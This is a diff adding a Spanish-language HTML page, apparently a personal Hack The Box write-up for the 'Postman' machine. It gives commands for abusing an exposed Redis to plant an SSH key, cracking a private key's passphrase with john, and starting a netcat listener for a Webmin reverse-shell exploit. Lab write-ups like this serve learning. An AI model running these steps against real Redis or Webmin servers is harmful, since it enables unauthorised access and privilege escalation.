@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Writeup HTB Postman | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="../src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="../index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Navegación principal">
+        <a data-nav="inicio" href="../index.html">Inicio</a>
+        <a data-nav="writeups" href="../writeups.html">Writeups</a>
+        <a data-nav="scripts" href="../scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box · Linux</p>
+      <h1>Postman</h1>
+      <p class="headline">Redis expuesto, pivote SSH y escalada por Webmin</p>
+      <p class="meta">Dificultad: Media · Objetivo: root</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+        <h2>Resumen técnico</h2>
+        <p>
+          El vector inicial se apoya en un servicio <code>Redis</code> accesible sin controles suficientes. Aprovechando
+          capacidades de escritura, se inyecta una clave pública SSH en <code>authorized_keys</code> del usuario
+          <code>redis</code>, logrando acceso al sistema. Posteriormente se recupera una llave privada cifrada en
+          <code>/opt</code>, se crackea su passphrase y se pivotea a <code>Matt</code>, cuenta que permite comprometer
+          Webmin y terminar en <code>root</code>.
+        </p>
+      </section>
+
+      <section class="panel panel-large">
+        <h2>1) Enumeración y abuso de Redis</h2>
+        <p>
+          El escaneo reveló <code>22</code>, <code>80</code>, <code>6379</code> y <code>10000</code>. El puerto 6379
+          permitió conexión con <code>redis-cli</code> y modificación de <code>dir</code>/<code>dbfilename</code> para
+          escribir una clave en el archivo de autorización SSH.
+        </p>
+        <pre><code>(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") &gt; spaced_key.txt
+cat spaced_key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
+redis-cli -h 10.129.2.1
+config set dir /var/lib/redis/.ssh
+config set dbfilename authorized_keys
+save</code></pre>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/postman/postman-redis-abuse.png" alt="Abuso de Redis para inyectar authorized_keys" />
+          <figcaption class="writeup-caption">Configuración de Redis para escribir la clave SSH en authorized_keys.</figcaption>
+        </figure>
+        <p>
+          Con esto se obtuvo shell como <code>redis</code> por SSH.
+        </p>
+      </section>
+
+      <section class="panel panel-large">
+        <h2>2) Pivote al usuario Matt</h2>
+        <p>
+          En <code>/opt/id_rsa.bak</code> apareció una clave privada cifrada. Se extrajo hash con
+          <code>ssh2john</code> y se crackeó con <code>john</code>, recuperando la passphrase
+          <code>computer2008</code>.
+        </p>
+        <pre><code>ssh2john id_rsaMatt &gt; hashMatt
+john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashMatt
+ssh -i id_rsaMatt matt@10.129.2.1</code></pre>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/postman/postman-id-rsa-crack.png" alt="Crackeo de passphrase de id_rsa.bak" />
+          <figcaption class="writeup-caption">Extracción y crackeo de la passphrase de la clave privada encontrada en /opt.</figcaption>
+        </figure>
+      </section>
+
+      <section class="panel panel-large">
+        <h2>3) Escalada final por Webmin</h2>
+        <p>
+          Con credenciales de <code>Matt</code> se accedió a Webmin (<code>10000/tcp</code>) y se ejecutó un script de
+          explotación con reverse shell codificada en base64. Tras levantar listener, la ejecución entregó shell con
+          privilegios de <code>root</code>.
+        </p>
+        <pre><code>nc -lvnp 4444
+python3 webmin_exploit.py</code></pre>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/postman/postman-root-shell.png" alt="Shell root obtenida tras explotación de Webmin" />
+          <figcaption class="writeup-caption">Ejecución del exploit y recepción de shell con privilegios elevados.</figcaption>
+        </figure>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="../writeups.html">Volver a writeups</a>
+    </footer>
+
+    <script type="module" src="../src/js/site.js"></script>
+  </body>
+</html>
